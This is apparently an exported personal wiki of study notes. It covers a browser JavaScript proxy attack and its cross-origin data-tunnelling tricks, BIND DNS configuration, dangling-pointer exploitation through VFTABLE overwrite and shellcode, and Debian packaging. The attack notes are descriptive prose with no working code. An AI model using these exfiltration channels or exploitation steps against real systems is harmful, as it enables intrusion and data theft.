Because of the same origin rule, XHR is not suitable for returning data to the attack server. There are two methods used in the demonstration. If it is a small amount of text data, an image object is created with the source pointing at the controller script. The data is included as a parameter value in the URL's query string. When the image is appended to the document, the browser will automatically generate the request. No image is actually returned by the controller script.

''Controller script to ~JavaScript Proxy''
Since a browser cannot accept inbound network connections, the ~JavaScript proxy must initiate all communication. When the ~JavaScript proxy polls the contorller script for data (such as the next HTTP request to process), the response is ~JavaScript file with the data set in variables that can be retrieved by the ~JavaScript proxy.

In essence, this is intentional XSS: the document is loaded the randomly generated hostname, but the script is loaded from the attack server's secondary IP address (or secondary hostname). As a result, some anti-XSS filters might block this request. However, no XSS is required for a successful attack.

There are several other methods to transfer data from the controller script besided XSS. While the same-origin policy prevents most explicit data exchange, ~JavaScript can still infer data about content from different origins. For example: the dimensions of an image are accessible in ~JavaScript, regardless of which server provided the file. This allows for a series of images to be requested by ~JavaScript with one byte encoded in the width and one byte in the height. Firefox will load bitmap with headers, but no graphic content, allowing the files to be stripped down to 66-bytes. While this technique is slow, it is effective. Considering that cross-domain image loading is very common on the internet, it would be extermely difficult to detext and block.

A similar technique tunnels data through dynamically loaded Cascading Style Sheets. Again, most data in a different origin CSS cannot be directly accessed by ~JavaScript. However, some data in a style class can be inferred once it is applied to a document component. Margin sizes are one example, Firefox allows margins to be set to millions to pixels, allowing at least two bytes of data to be encoded in each margin setting. Bulk data can be transferred by creating series of sequentially named classes. Once the style sheet is loaded, it is trivial for ~JavaScript to apply each class to a DIV tag, measure the actual margin sizes, and then decode the data. Since an unlimited number of classes can be defined in a single style sheet, performance is much better than the image dimension method, and approaches the XSS method.


</pre>
</div>
<div title="DNS and BIND" modifier="YourName" modified="201006070249" created="201006061518" changecount="10">
<pre>!Types of Nameservers
A primary master nameserver for a zone reads the data for the zone from a file on its host. A secondary master nameserver for a zone gets the zone data from another nameserver authoritative for the zone, called its master server. Quite often, the master server is the zone's primary master, but that's not required: a secondary master can load zone data from another secondary. Nowadays, the preferred term for a secondary master nameserver is a slave.

!Queries
Queries come in two flavors, recursive and iterative, also called nonrecursive. Recursive queries place most of the burden of resolution on a single nameserver. Recursion, or recursive resolution, is just a name for the resolution process used by a nameserver when it receives recursive queries. 
In recursion, a resolver sends a recursive query to a nameserver for information about a particular domain name. The queried nameserver is then obliged to respond with the requested data or with an error stating either that data of the requested type doesn't exist or that the domain name specified doesn't exist.[*] The nameserver can't just refer the querier to a different nameserver, because the query was recursive. If the queried nameserver isn't authoritative for the data requested, it will have to query other nameservers to find the answer.

!Setting Up Zone Data
The DNS version of the data has multiple files. One file maps all the hostnames to addresses. Other files map the addresses back to hostnames. A file that maps hostnames to addresses is called db.DOMAIN. For movie.edu, this file is called db.movie.edu. The files mapping addresses to hostnames are called db.ADDR, where ADDR is the network number without trailing zeros or the specification of a netmask. In our example, the files are called db.192.249.249 and db.192.253.253; there's one for each network. There are a few other zone datafiles: db.cache and db.127.0.0. 

!Zone Data Files
DNS lookups are case-insensitive, so you can enter names in your zone datafiles in uppercase, lowercase, or mixed case. However, even though lookups are case-insensitive, case is preserved. That way, if you add records for Titanic.movie.edu to your zone data, people looking up titanic.movie.edu will find the records, but with a capital &quot;T&quot; in the domain name. 

Resource records must start in the first column of a line. The order of resource records in the zone datafiles is as follows: 

* SOA record 
** Indicates authority for this zone 
* NS record 
** Lists a nameserver for this zone 
* A 
** Name-to-address mapping 
* PTR 
** Address-to-name mapping 
* CNAME 
** Canonical name (for aliases) 

!!!SOA record
{{{
@ movie.edu. IN SOA toystory.movie.edu. al.movie.edu. (
                          1        ; Serial
                          3h       ; Refresh after 3 hours
                          1h       ; Retry after 1 hour
                          1w       ; Expire after 1 week
                          1h )     ; Negative caching TTL of 1 hour
}}}
The first name after SOA (toystory.movie.edu.) is the name of the primary nameserver for the movie.edu zone. The second name (al.movie.edu.) is the mail address of the person in charge of the zone if you replace the first &quot;.&quot; with an &quot;@&quot;. Often you'll see root, postmaster, or hostmaster as the email address. Nameservers won't use this address; it's meant for human consumption. 

Serial number can any number like date, but it should always increase with changes to zone data. Slaves when contacting master check the serial number for verification of any changes. 

'retry' value is used if slave cannot reach the master currently and when to retry connecting to the master. 

'expire' declares when the slave will expire the cached data. If master could not reached even after retries then the config expires after expire time. 

add similar SOA records to the beginning of the db.192.249.249 and db.192.253.253 files. In these files, we change the first name in the SOA record from movie.edu. to the name of the appropriate in-addr.arpa zone: 249.249.192.in-addr.arpa. and 253.253.192.in-addr.arpa., respectively. 

!!!NS record
We add one NS record for each nameserver authoritative for our zone. Here are the NS records from the db.movie.edu file: 
{{{
movie.edu.  IN NS  toystory.movie.edu.
movie.edu.  IN NS  wormhole.movie.edu.
}}}
As with the SOA record, we add NS records to the db.192.249.249 and db.192.253.253 files, too. 


!!!Address and Alias records
{{{
;
; Host addresses
;
localhost.movie.edu.      IN A     127.0.0.1
shrek.movie.edu.          IN A     192.249.249.2
toystory.movie.edu.       IN A     192.249.249.3
monsters-inc.movie.edu.   IN A     192.249.249.4
misery.                   IN A     192.253.253.2
shining.movie.edu.        IN A     192.253.253.3
carrie.movie.edu.         IN A     192.253.253.4
;
; Multi-homed hosts
;
wormhole.movie.edu.       IN A     192.249.249.1
wormhole.movie.edu.       IN A     192.253.253.1
;
; Aliases
;
toys.movie.edu.           IN CNAME toystory.movie.edu.
mi.movie.edu.             IN CNAME monsters-inc.movie.edu.
wh.movie.edu.             IN CNAME wormhole.movie.edu.
wh249.movie.edu.          IN A     192.249.249.1
wh253.movie.edu.          IN A     192.253.253.1
}}}
A CNAME record maps an alias to its canonical name. When a nameserver looks up a name and finds a CNAME record, it replaces the name with the canonical name and looks up the new name. For example, when the nameserver looks up wh.movie.edu, it finds a CNAME record pointing to wormhole.movie.edu. It then looks up wormhole.movie.edu and returns both addresses. 

There is one thing to remember about aliases like toys.movie.edu: they should never appear on the right side of a resource record. Notice that the NS records we just created use the canonical name. 

if a host is multihomed (has more than one network interface), create an address (A) record for each alias unique to one address and then create a CNAME record for each alias common to all the addresses. 

!!!PTR record
{{{
1.249.249.192.in-addr.arpa.  IN PTR wormhole.movie.edu.
2.249.249.192.in-addr.arpa.  IN PTR shrek.movie.edu.
3.249.249.192.in-addr.arpa.  IN PTR toystory.movie.edu.
4.249.249.192.in-addr.arpa.  IN PTR monsters-inc.movie.edu.
}}}
Addresses should point to only a single name: the canonical name. 

!!!MX record
MX records specify a mail exchanger for a domain name: a host that will either process or forward mail for the domain name. Processing the mail means either delivering it to the individual to whom it's addressed or gatewaying it to another mail transport, such as X.400. Forwarding means sending it to its final destination or to another mail exchanger closer to the destination via SMTP

{{{
plange.puntacana.dr.  IN  MX  1 listo.puntacana.dr.
plange.puntacana.dr.  IN  MX  2 hep.puntacana.dr.
}}}
specifies that listo.puntacana.dr is a mail exchanger for plange.puntacana.dr at preference value 10. Taken together, the preference values of a destination's mail exchangers determine the order in which a mailer should use them. Mailers should attempt delivery to the mail exchangers with the lowest preference values first. The most preferred mail exchanger has the lowest preference value.

To prevent mail from looping between mail servers, mailers discard certain MX records before they decide where to send a message. A mailer sorts the list of MX records by preference value and looks in the list for the canonical domain name of the host on which it's running. If the local host appears as a mail exchanger, the mailer discards that MX record and all MX records in which the preference value is equal or higher (that is, equally or less-preferred mail exchangers). That prevents the mailer from sending messages to itself or to mailers &quot;farther&quot; from the eventual destination. 

!!!Responsible Person and TXT record
The record takes two arguments as its record-specific data: an electronic mail address in domain name format and a domain name pointing to additional data about the contact. The electronic mail address is in the same format the SOA record uses: it substitutes a &quot;.&quot; for the &quot;@&quot;. The next argument is a domain name, which must have a TXT record associated with it. The TXT record then contains free-format information about the contact, such as full name and phone number. If you omit either field, you must specify the root domain (&quot;.&quot;) as a placeholder instead. 
Here are some example RP (and associated) records: 
{{{
shrek        IN  RP   root.movie.edu.  hotline.movie.edu.
             IN  RP   snewman.movie.edu.  sn.movie.edu.
hotline      IN  TXT  &quot;Movie U. Network Hotline, (415) 555-4111&quot;
sn           IN  TXT  &quot;Sommer Newman, (415) 555-9612&quot;
}}}

!BIND configuration
On a primary server, the configuration file contains one zone statement for each zone datafile to be read. Each line starts with the keyword zone followed by the zone's domain name and the class (in stands for Internet). The type master indicates this server is a primary nameserver. The last line contains the filename: 
{{{
zone &quot;movie.edu&quot; in {
      type master;
      file &quot;db.movie.edu&quot;;
};
zone &quot;249.249.192.in-addr.arpa&quot; in {
        type master;
        file &quot;db.192.249.249&quot;;
};
zone &quot;253.253.192.in-addr.arpa&quot; in {
        type master;
        file &quot;db.192.253.253&quot;;
};
zone &quot;0.0.127.in-addr.arpa&quot; in {
        type master;
        file &quot;db.127.0.0&quot;;
};
zone &quot;.&quot; in {
        type hint;
        file &quot;db.cache&quot;;
};
}}}
By default, BIND expects the configuration file to be named /etc/named.conf. The zone datafiles for our example are in the directory /var/named.

!Configuring Slave
{{{
zone &quot;movie.edu&quot; in {
      type slave;
      file &quot;bak.movie.edu&quot;;
      masters { 192.249.249.3; };
};
}}}
The slave nameserver keeps a backup copy of this zone in the local file bak.movie.edu. 

!sortlist directive 
{{{
sortlist 128.32.42.0/255.255.255.0 15.0.0.0
}}}
The resolver sorts any addresses in a reply that match these arguments into the order in which they appear in the directive, and appends addresses that don't match to the end. 

!options directive
BIND 8.2 introduced four new resolver options: attempts, timeout, rotate, and no-check-names. attempts allows you to specify how many queries the resolver should send to each nameserver in resolv.conf before giving up (default:2). timeout allows you to specify the initial timeout for a query to a nameserver in resolv.conf. The default value is five seconds. For the second and successive rounds of queries, the resolver still doubles the initial timeout and divides by the number of nameservers in resolv.conf. rotate lets your resolver use all the nameservers in resolv.conf, not just the first one. 

Note that many programs can't take advantage of this because they initialize the resolver, look up a name, then exit. Rotation has no effect on repeated ping commands, for example, because each ping process initializes the resolver, queries the first nameserver in resolv.conf, and then exits before using the resolver again. Each successive invocation of ping has no idea which nameserver the previous one usedor even that ping was run earlier. But long-lived processes that send lots of queries, such as a sendmail daemon, can take advantage of rotation. 

!ndc and controls
You send messages to a nameserver via the control channel using a program called ndc (in BIND 8) or rndc (in BIND 9). Prior to BIND 8.2, ndc was simply a shell script that allowed you to substitute convenient arguments (such as reload) for signals (such as HUP). We'll talk about that version of ndc later in this chapter. 

Executed without arguments, ndc will try to communicate with a nameserver running on the local host by sending messages through a Unix domain socket. The socket is usually called /var/run/ndc. You can also use ndc to send messages across a TCP socket to a nameserver, possibly remote from the host that you're running ndc on. To use this mode of operation, run ndc with the -c command-line option, specifying the name or address of the nameserver, a slash, and the port on which it's listening for control messages. For example: 
{{{
# ndc -c 127.0.0.1/953
}}}

To configure your nameserver to listen on a particular TCP port for control messages, use the controls statement: 
{{{
controls {
    inet 127.0.0.1 port 953 allow { localhost; };
};
controls {
    inet * port 953 allow { localnets; };
};
}}}

!rndc and controls
{{{
controls {
       inet * allow { any; } keys { &quot;rndc-key&quot;; };
};
}}}

This determines which cryptographic key rndc users must authenticate themselves with to send control messages to the nameserver. If you leave the keys specification out, you'll see this message after the nameserver starts: 
{{{
Jan 13 18:22:03 terminator named[13964]: type 'inet' control channel
has no 'keys' clause; control channel will be disabled
}}}
The key or keys specified in the keys substatement must be defined in a key statement: 
{{{
key &quot;rndc-key&quot; {
        algorithm hmac-md5;
        secret &quot;Zm9vCg==&quot;;
};
}}}
The key statement can go directly in named.conf, but if your named.conf file is world-readable, it's safer to put it in a different file that's not world-readable and include that file in named.conf: 
{{{
include &quot;/etc/rndc.key&quot;;
}}}
The only algorithm currently supported is HMAC-MD5, a technique for using the fast MD5 secure hash algorithm to do authentication.[*] The secret is simply the base-64 encoding of a password that named and authorized rndc users will share. You can generate the secret using programs such as mmencode or dnssec-keygen from the BIND distribution. For example, you can use mmencode to generate the base-64 encoding of foobarbaz: 
{{{
% mmencode foobarbaz
CmZvb2JhcmJh
}}}

If your version of BIND comes with rndc-confgen, you can let the tool do most of the work for you. Simply run: 
{{{
# rndc-confgen &gt; /etc/rndc.conf

Here is what you'll see in /etc/rndc.conf: 
# Start of rndc.conf
key &quot;rndc-key&quot; {
    algorithm hmac-md5;
    secret &quot;4XErjUEy/qgnDuBvHohPtQ==&quot;;
};
options {
    default-key &quot;rndc-key&quot;;
    default-server 127.0.0.1;
    default-port 953;
};
# End of rndc.conf
# Use with the following in named.conf,
# adjusting the allow list as needed:
#
# key &quot;rndc-key&quot; {
#     algorithm hmac-md5;
#     secret &quot;4XErjUEy/qgnDuBvHohPtQ==&quot;;
# };
#
# controls {
#     inet 127.0.0.1 port 953
#         allow { 127.0.0.1; } keys { &quot;rndc-key&quot;; };
# };
# End of named.conf
}}}

!!!rndc commands
* reload 
** Same as the ndc command. 
* refresh zone 
** Schedules an immediate refresh for the specified zone (i.e., an SOA query to the zone's master). 
* retransfer zone 
** Immediately retransfers the specified zone without checking the serial number. 
* freeze zone 
** Suspends dynamic updates to the specified zone. Covered in Chapter 10. 
* thaw zone 
** Resumes dynamic updates to the specified zone. Covered in Chapter 10. 
* reconfig 
** Same as the ndc command. 
* stats 
** Same as the ndc command. 
* querylog 
** Same as the ndc command. 
* dumpdb 
** Same as the ndc command. Also allows you to specify whether to dump just cache with the -cache option, authoritative zones with the -zones option, or both with the -all option. 
* stop 
** Same as the ndc command. 
* halt 
** Same as stop, but doesn't save pending dynamic updates. 
* trace 
** Same as the ndc command. 
* notrace 
** Same as the ndc command. 
* flush 
** Flushes (empties) the nameserver's cache. 
* flushname name 
** Flushes all records attached to the specified domain name from the nameserver's cache. 
* status 
** Same as the ndc command. 
* recursing 
** Dump information about the recursive queries currently being processed to the file named.recursing in the current working directory. 

!!!Adding or Deleting hosts 
* Update the serial number in db.DOMAIN.
* Add any A (address), CNAME (alias), and MX (mail exchanger) records for the host to the db.DOMAIN file.
* Update the serial number and add PTR records to each db.ADDR file for which the host has an address.
* Reload the primary nameserver; this forces it to load the new information:
** # rndc reload
** # rndc reload movie.edu

!Caching-only name servers
Creating caching-only nameservers is another alternative when you need more servers. Caching-only nameservers are nameservers not authoritative for any zones (except 0.0.127.in-addr.arpa). The named.conf file for a caching-only server contains these lines: 
{{{
options {
    directory &quot;/var/named&quot;;  // or your data directory
};
zone &quot;0.0.127.in-addr.arpa&quot; {
    type master;
    file &quot;db.127.0.0&quot;;
};
zone &quot;.&quot; {
    type hint;
    file &quot;db.cache&quot;;
};
}}}

!Subdomain in Parent's zone
By creating resource records that refer to the subdomain within the parent's zone.
{{{
brazil.personnel      IN  A      192.253.253.10
                      IN  MX     10 brazil.personnel.movie.edu.
                      IN  MX     100 postmanrings2x.movie.edu.
employeedb.personnel  IN  CNAME  brazil.personnel.movie.edu.
db.personnel          IN  CNAME  brazil.personnel.movie.edu.
}}}

!Delegating a subdomain
To delete fx.movie.edu to bladerunner and outland servers
{{{
fx    86400    IN    NS    bladerunner.fx.movie.edu.
      86400    IN    NS    outland.fx.movie.edu.
bladerunner.fx.movie.edu.  86400  IN  A  192.253.254.2
outland.fx.movie.edu.      86400  IN  A  192.253.254.3
}}}

!Subdomains in in-addr.arpa domain
Within its db.172.20 zone datafile, it needs to add NS records like these: 
{{{
2     86400    IN    NS    gump.fx.altered.edu.
15    86400    IN    NS    prettywoman.makeup.altered.edu.
15    86400    IN    NS    priscilla.makeup.altered.edu.
25    86400    IN    NS    blowup.foley.altered.edu.

200.1.15.in-addr.arpa.    86400    IN    NS    ns-1.cns.hp.com.
201.1.15.in-addr.arpa.    86400    IN    NS    ns-1.cns.hp.com.
}}}

!Dynamic DNS updates
For the most part, dynamic update functionality is used by programs such as DHCP servers that assign IP addresses automatically to computers and then need to register the resulting name-to-address and address-to-name mappings. Some of these programs use the new ns_update() resolver routine to create update messages and send them to an authoritative server for the zone that contains the domain name. 

It's also possible to create updates manually with the command-line program nsupdate, which is part of the standard BIND distribution. nsupdate reads one-line commands and translates them into an update message. Commands can be specified on standard input (the default) or in a file, whose name must be given as an argument to nsupdate. Commands not separated by a blank line are incorporated into the same update message, as long as there's room. 
nsupdate understands the following commands: 

* prereq yxrrset domain name type [rdata] 
** Makes the existence of an RRset of type type owned by domain name a prerequisite for performing the update specified in successive update commands. If rdata is specified, it must also match. 
* prereq nxrrset domain name type 
** Makes the nonexistence of an RRset of type type owned by domain name a prerequisite for performing the update specified. 
* prereq yxdomain domain name 
** Makes the existence of the specified domain name a prerequisite for performing the update. 
* prereq nxdomain domain name 
** Makes the nonexistence of the specified domain name a prerequisite for performing the update. 
* update delete domain name [type] [rdata] 
** Deletes the domain name specified or, if type is also specified, deletes the RRset specified or, if rdata is also specified, deletes the record matching domainname, type, and rdata. 
* update add domain name ttl [class] type rdata 
** Adds the record specified to the zone. Note that the TTL, in addition to the type and resource record-specific data, must be included, but the class is optional and defaults to IN. 
So, for example, the command: 
{{{
% nsupdate
&gt; prereq nxdomain mib.fx.movie.edu.
&gt; update add mib.fx.movie.edu. 300 A 192.253.253.16
&gt; send
% nsupdate
&gt; prereq yxrrset mib.fx.movie.edu. MX
&gt; update delete mib.fx.movie.edu. MX
&gt; update add mib.fx.movie.edu. 600 MX 10 mib.fx.movie.edu.
&gt; update add mib.fx.movie.edu. 600 MX 50 postmanrings2x.movie.edu.
&gt; send
}}}

As with queries, the nameservers that process dynamic updates answer them with DNS messages that indicate whether the update was successful and, if not, what went wrong. Updates may fail for many reasons: for example, because the nameserver wasn't actually authoritative for the zone being updated, because a prerequisite wasn't satisfied, or because the updater wasn't allowed. 
There are some limitations to what you can do with dynamic update: you can't delete a zone entirely (though you can delete everything in it except the SOA record and one NS record), and you can't add new zones. 

When a nameserver processes a dynamic update, it's changing a zone and must increment that zone's serial number to signal the change to the zone's slaves. This is done automatically. However, the nameserver doesn't necessarily increment the serial number for each dynamic update. 

BIND 8 nameservers defer updating a zone's serial number for as long as 5 minutes or 100 updates, whichever comes first. The deferral is intended to deal with a mismatch between a nameserver's ability to process dynamic updates and its ability to transfer zones: the latter may take significantly longer for large zones. When the nameserver does finally increment the zone's serial number, it sends a NOTIFY announcement (described later in this chapter) to tell the zone's slaves that the serial number has changed. BIND 9 nameservers update the serial number once for each dynamic update that is processed. 

when they receive dynamic updates, both BIND 8 and 9 nameservers simply append a short record of the update to a logfile.[*] The change takes effect immediately in the copy of the zone the nameservers maintain in memory, of course. But the nameservers can wait and write the entire zone to disk only at a designated interval (hourly, usually). BIND 8 nameservers then delete the logfile because it's no longer needed. (At that point, the copy of the zone in memory is the same as that on disk.) BIND 9 nameservers, however, leave the logfile because they also use it for incremental zone transfers, which we'll cover later in this chapter. (BIND 8 nameservers keep incremental zone transfer information in another file.)

allow-update takes an address match list as an argument. The address or addresses matched by the list are the only addresses allowed to update the zone. It's prudent to make this access control list as restrictive as possible: 
{{{
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    allow-update { 192.253.253.100; }; // just our DHCP server
};
}}}

The allow-update-forwarding substatement takes an address match list as an argument. Only updates from IP addresses that match the address match list will be forwarded. So the following zone statement forwards only those updates from the Special Effects Department's subnet: 
{{{
zone &quot;fx.movie.edu&quot; {
    type slave;
    file &quot;bak.fx.movie.edu&quot;;
    allow-update-forwarding { 192.253.254/24; };
};
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    allow-update { key dhcp-server.fx.movie.edu.; }; // allow only updates
                                                     // signed by the DHCP
                                                     // server's TSIG key
};
So, if the host mummy.fx.movie.edu uses a key called mummy.fx.movie.edu to sign its dynamic updates, we can restrict mummy.fx.movie.edu to updating its own records with the following: 
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy { grant mummy.fx.movie.edu. self mummy.fx.movie.edu.; };
};

or just its own address records with this: 
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy { grant mummy.fx.movie.edu. self mummy.fx.movie.edu. A; };
};

More generally, we can restrict all our clients to updating only their own address records using: 
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy { grant *.fx.movie.edu. self fx.movie.edu. A; };
};
zone &quot;fx.movie.edu&quot; {
    type master;
    file &quot;db.fx.movie.edu&quot;;
    update-policy {
        grant dhcp-server.fx.movie.edu. wildcard *.fx.movie.edu. A TXT PTR;
    };
};
}}}

!DNS NOTIFY (Zone Change Notification)
When does the nameserver notice a change? Restarting a primary nameserver causes it to notify all its slaves as to the current serial number of all of its zones because the primary has no way of knowing whether its zone datafiles were edited before it started. Reloading one or more zones with new serial numbers causes a nameserver to notify the slaves of those zones. And a dynamic update that causes a zone's serial number to increment also causes notification. 
{{{
zone &quot;fx.movie.edu&quot; {
    type slave;
    file &quot;bak.fx.movie.edu&quot;;
    notify yes;
    also-notify { 15.255.152.4; }; // This is a BIND 8 slave, which
                                   // must be explicitly configured
                                   // to notify its slave
};
}}}

!Incremental Zone Transfer (IXFR)
{{{
options {
    directory &quot;/var/named&quot;;
    ixfr-from-differences yes;
};
}}}

!Forwarding
A primary or slave nameserver's mode of operation changes slightly when it is configured to use a forwarder. If a resolver requests records that are already in the nameserver's authoritative data or cached data, the nameserver answers with that information; this part of its operation hasn't changed. However, if the records aren't in its database, the nameserver sends the query to a forwarder and waits a short period for an answer before resuming normal operation and starting the iterative name resolution process. This mode of operation is called forward first. What the nameserver is doing differently here is sending a recursive query to the forwarder, expecting it to find the answer. At all other times, the nameserver sends out only nonrecursive queries to other nameservers. 

You may want to restrict your nameservers even furtherstopping them from even trying to contact an off-site server if their forwarder is down or doesn't respond. You can do this by configuring your nameservers to use forward-only mode.

{{{
options {
    forwarders { 192.249.249.1; 192.249.249.3; };
    forward only;
};
}}}

!Round-robin load balancing
{{{
foo.bar.baz.    60    IN    A    192.168.1.1
foo.bar.baz.    60    IN    A    192.168.1.2
foo.bar.baz.    60    IN    A    192.168.1.3
}}}
It's a good idea to reduce the records' time to live, too, as we did in this example. This ensures that if the addresses are cached on an intermediate nameserver that doesn't support round-robin, they'll time out of the cache quickly. If the intermediate nameserver looks up the name again, your authoritative nameserver can round-robin the addresses again. 

!rrset-order
if we want to ensure that the address records for www.movie.edu are always returned in the same order, we'd use this rrset-order substatement:
{{{
options {
    rrset-order {
        class IN type A name &quot;www.movie.edu&quot; order fixed;
    };
};
options {
    rrset-order {
        order random;
    };
};
options {
    rrset-order {
        type A name &quot;*.movie.edu&quot; order cyclic;
    };
};
}}}
The default behavior is: 
{{{
options {
    rrset-order {
        class IN type ANY name &quot;*&quot; order cyclic;
    };
};
}}}

!TSIG
 transaction signatures, or TSIG for short. TSIG uses shared secrets and a one-way hash function to authenticate DNS messages, particularly responses and updates. With TSIG configured, a nameserver or updater adds a TSIG record to the additional data section of a DNS message. The TSIG record &quot;signs&quot; the DNS message, proving that the message's sender had a cryptographic key shared with the receiver and that the message wasn't modified after it left the sender. 

TSIG provides authentication and data integrity through the use of a special type of mathematical formula called a one-way hash function. A one-way hash function, also known as a cryptographic checksum or message digest, computes a fixed-size hash value based on arbitrarily large input. The magic of a one-way hash function is that each bit of the hash value depends on each and every bit of the input. Change a single bit of the input, and the hash value changes dramatically and unpredictablyso unpredictably that it's &quot;computationally infeasible&quot; to reverse the function and find an input that produces a given hash value. 

TSIG uses a one-way hash function called MD5. In particular, it uses a variant of MD5 called HMAC-MD5. HMAC-MD5 works in a keyed mode in which the 128-bit hash value depends not only on the input, but also on a key. 

we need to configure both nameservers with a common key: 
{{{
key toystory-wormhole.movie.edu. {
    algorithm hmac-md5;
    secret &quot;skrKc4Twy/cIgIykQu7JZA==&quot;;
};
}}}

{{{
# dnssec-keygen -a HMAC-MD5 -b 128 -n HOST toystory-wormhole.movie.edu.
Ktoystory-wormhole.movie.edu.+157+28446
}}}

There's one last problem that we see cropping up frequently with TSIG: time synchronization. The timestamp in the TSIG record is useful for preventing replay attacks, but it tripped us up initially because the clocks on our nameservers weren't synchronized. (They need to be synchronized to within five minutes, the default value for &quot;fudge.&quot;) 

If you're only concerned about zone transfers (and not about general query traffic, for example), you can specify the key in the masters substatement for any slave zones:  Now, on toystory.movie.edu, we can restrict zone transfers to those signed with the toystory-wormhole.movie.edu key: 
{{{
zone &quot;movie.edu&quot; {
    type slave;
    masters { 192.249.249.1 key toystory-wormhole.movie.edu.; };
    file &quot;bak.movie.edu&quot;;
};

zone &quot;movie.edu&quot; {
    type master;
    file &quot;db.movie.edu&quot;;
    allow-transfer { key toystory-wormhole.movie.edu.; };
};
}}}

!Firewall
Internal nameservers that can directly query nameservers on the Internet don't require any special configuration. Their root hints files contain the Internet's root nameservers, which enables them to resolve Internet domain names. Internal nameservers that can't query nameservers on the Internet, however, need to know to forward queries they can't resolve to one of the nameservers that can. This is done with the forwarders substatement,

Ours is a packet-filtering firewall, and we negotiated with our firewall administrator to allow DNS traffic between Internet nameservers and two of our nameservers, toystory.movie.edu and wormhole.movie.edu. Here's how we configured the other internal nameservers at the university. For our BIND 8 and 9 nameservers, we used the following: 
{{{
options {
    forwarders { 192.249.249.1; 192.249.249.3; };
    forward only;
};


options {
    directory &quot;/var/named&quot;;
    forwarders { 192.249.249.1; 192.253.253.3; };
};
zone &quot;movie.edu&quot; {
    type slave;
    masters { 192.249.249.3; };
    file &quot;bak.movie.edu&quot;;
    forwarders {};
};
}}}
</pre>
</div>
<div title="Dangling Pointer" modifier="BhargavaKancherla" modified="200807071142" created="200801160653" changecount="3">
<pre>!Dangling Pointer

The most common result of this bug is the crash of the application or running thread. This is a nuisance, but not a code injection security threat. However, imagine if one could control the data that the dangling pointer points to. If that were possible, one could alter the behaviour of the application and even inject malicious code into it.

Objects that use virtual functions contain a pointer to their ''VFTABLE'' which is a table of pointers to the object's virtual functions. The ''VFTABLE'' pointer is always located in the first ''DWORD'' of the object's memory area. The ''VFTABLE'' is compiled into every instance of the class.

The basic priniciple of exploitation is overwriting the old object memory space with malicious data

[img[images/dangling_pointer_1.jpg]]

In order to exploit the vulnerability, we will set the first DWORD of the malicious data to contain special address that will take the place of the object's VFTABLE. The rest of the memory will contain a shellcode that will be executed. 

In order to use the exploit
#Find an address somewhere in the memory that holds the CALL/JMP ECX, which we will refer to it as the Call Address. Next we need to find a location somewhere in the memory that points to the Call Address.
#Change the VFTABLE pointer so that its value is (Pcall Address  OFFSET), which we'll call the Jumping Address
#Ensure that our new VFTABLE pointer, when interpreted as code, can be executed and doesn't significantly change the application flow and content of the registers. This is important because the CALL/JMP ECX is transferring the execution of the application to the start of our inserted buffer that holds the Jumping Address.  

We need to be able to overwrite the object's VFTABLE with our own value (after the object's de-allocation and before virutal function call). This means we need to find places where :

#The application allocates the exact amount of memory required for the malicious data
#The memory chunk's content is filled with user supplied data.
#The allocation must assign memory in the old object's heap, and not a different heap. 

</pre>
</div>
<div title="Debian Package" modifier="BhargavaKancherla" modified="200801151625" created="200801151351" changecount="6">
<pre>Every ''.deb'' is an archive that contains just an ''ar'' archive

{{{
[root@asldfjk]:# ar t tcpdump_i386.deb
debian.binary
control.tar.gz
data.tar.gz
[root@asldfjk]:#
}}}

!dpkg

''dpkg &lt;html&gt;--info&lt;/html&gt; foo.deb'' will list metadata about the package, mostly listed information from control file
''dpkg &lt;html&gt;--contents&lt;/html&gt; foo.deb'' will list the files in the package
''dpkg &lt;html&gt;--unpack&lt;/html&gt; foo.deb'' will extract the package locally
''dpkg &lt;html&gt;--install&lt;/html&gt; foo.deb'' will install the package on the local system

!control.tar.gz

''Package'' contain package name not the file  name
''Source'' shows the source pacakge from which the binary packages was built
''Version'' will show full package version, including the upstream version (before the hyphen) and Debian version (after the hyphen)
''Architecture'' will show the CPU for which the package was  built
''Depends, Recommends, Suggests, Replaces, Conflicts, Enhances'' outline the relationships with other packages

!Maintainer Scripts

Typically bash or perl scripts.

''preinst'' Run prior to extraction onto filesystem
''postinst'' Run after the extraction onto filesystem
''prerm'' Run prior to removal from filesystem
''postrm'' Run after removal from filesystem
''config'' ask questions to seed to other maintainer scripts

!debian/rules

rules file controls how the package is built.

''configure'' does pre-build configuration such as running ./configure with appropriate options.
''build'' complies the package from the source
''install'' copies/moves files from their build destination into the installation tree.
''binary, binary-arch and binar-indep'' create the binary packages. Typically calls -arch, -indep
''clean'' returns the packate to the prebuilt stage

!Building Debian Package

''dh_make'' requires ''deb_helper'' package.

{{{
dh_make  -e blabla@blabla -f ./foo.tar.gz
}}}

and answer the questions. This will create a directory which contain control file ''control'' and the rules file ''rules''.

{{{
dpkg-buildpackage -fakeroot
}}}

''cvs-buildpackage'' customised for using cvs co and build and remove unncessary files.

</pre>
</div>
<div title="Debian Packaging" modifier="BhargavaKancherla" created="200807151011" changecount="1">
<pre>!.deb is just an &quot;ar&quot; archive containing
* ''data.tar.gz'' ( files for the filesystem)
* ''control.tar.gz'' ( maintainer scripts and extra meta data)
* ''debian-binary'' (package version :currently 2.0)
You can manually create and manipulate debian packages using standard unix tools. 
{{{
# ar t tcpdump_3.9.4-2_i3486.deb
debian-binary
control.tar.gz
data.tar.gz
}}}

!dpkg use with packages
{{{
# dpkg --info foo.deb # - Examine package metadata
# dpkg --contents foo.deb # - File listing
# dpkg --unpack foo.deb # - Extrace the package locally
# dpkg --install foo.deb - Extract and run configure scripts
}}}

!!dpkg {{{--info}}} includes
* ''Package'' - Actual package name 
* ''Source'' - The source package that this binary was built from
* ''Version'' : The full package versoin, including th eupstream version (before the hyphen) and debian version (after the hyphen(
* ''Architecture'' : Waht CPU the package was built for
* ''Depends, Recommends, Suggests, Replaces, Conflicts, Enchances'': Relationships with other packages. 

!!Maintainer Scripts 
They are executed on package installation and removal . Typically written in BASH or perl. The standard scripts are
* ''preinst'': run prior to extraction onto filesystem 
* ''postinst'': runafter extraction onto filesystem
* ''prerm'': run prior to removal from filesystem
* ''postrm'': run after removal from filesystem
